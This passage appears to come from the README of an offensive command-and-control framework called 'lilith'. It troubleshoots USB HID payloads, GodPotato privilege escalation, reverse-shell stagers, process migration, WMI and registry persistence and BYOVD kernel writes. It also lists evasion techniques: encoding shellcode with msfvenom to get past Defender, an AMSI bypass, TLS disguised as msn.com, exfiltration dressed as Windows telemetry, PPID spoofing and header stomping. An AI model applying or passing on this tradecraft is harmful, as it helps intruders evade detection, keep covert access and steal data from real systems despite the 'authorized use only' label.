- For USB payloads: try increasing `--usb-boot-delay` or `_PS_READY_MS` in `builders/usbhid.py` for slow targets

**GodPotato escalates but payload never runs**  
Encode the shellcode: `msfvenom ... -e x64/xor_dynamic -i 5 -f raw`. Common `shell_reverse_tcp` stubs are caught in memory by Defender.

**Runner key mismatch / stager decodes garbage**  
Runner and stagers must be built in the same session (shared `runner_c.meta`). Run `build --all` to keep them in sync.

**C2 result shows `[no output]`**  
Command executed but produced no output, or process creation failed silently. Try full paths (`C:\Windows\System32\whoami.exe`) or prefix with `cmd /c`.

**C2 result times out**  
Increase `--timeout` or `c2_timeout_s` in `engagement.yaml`. Agent poll jitter (10–30s default) means results can take up to 30s after execution.

**C2 stager runs but no session appears**
- `[scriptblock]::Create(...).Invoke()` returns immediately — agent is in background
- Wait up to 30s — agent polls every 10–30s before first check-in
- Confirm `lilith serve` is running and reachable on `http_port`

**Many duplicate sessions**  
The watchdog immediately injects a backup agent. Expected behavior. Kill unwanted sessions with `lilith c2 --kill <id>`.

**Migration fails**
- Confirm `lilith build --runner` was run — agent SC must exist in workspace
- Check `lilith serve` terminal for 404s on `AGENT-SC` requests
- Try specifying a target: `migrate explorer.exe`

**Persistence fires but no session appears**
- Confirm `lilith build --c2-stager` was run after the last `build --runner`
- For WMI: verify subscription exists:  
  `Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer`
- For Run/schtask: confirm trigger condition was met (full logon, not just unlock)

**BYOVD: kernel write fails / BSOD**
- Run `--hvci-check` first — HVCI blocks all kernel writes and cannot be bypassed with BYOVD
- Verify driver is loaded: `sc query <service>` or check Device Manager
- EPROCESS offsets are version-specific — verify target OS build matches supported range (Win10 20H2 – Win11 23H2)

---

## OPSEC notes

- Every runner build: unique hash, random symbol names, random XOR key, randomised section names, spoofed timestamp
- AMSI bypass uses precompiled DLL from memory — no `csc.exe`, no temp file, no inline C# source in ScriptBlock logs
- Stage downloads use SslStream (standard .NET TCP/TLS) — no COM activation event, not in EDR download-cradle signatures
- JA3/JA4 hash differs per compiled binary — no static TLS fingerprint
- HTTP traffic uses Edge 124 User-Agent and CDN-style paths with per-build randomised C2 path segments
- TLS cert presents as `*.msn.com`, 397-day validity; server mimics IIS/Schannel cipher order and JA3S
- Exfil wrapped in fake Windows telemetry JSON (`DiagTrack` schema)
- Tool output never written to disk on target
- PE headers stomped post-load; exec region zeroed and freed after shellcode completes
- Config strings re-encrypted in memory immediately after use
- PPID-spoofed spawn target rotates per invocation
- WMI persistence uses `Win32_ProcessStartTrace` logon trigger (not the commonly-swept uptime trigger)
- Persistence values stored as base64 `-enc` — no plaintext URLs or commands in registry/WMI at rest
- Potato chain spawns `powershell.exe` directly — no `cmd.exe` intermediary
- USB HID payloads contain no hardcoded URLs or tool names — stager URL is XOR-encoded in the keystroke payload

---

*For authorized use only.*
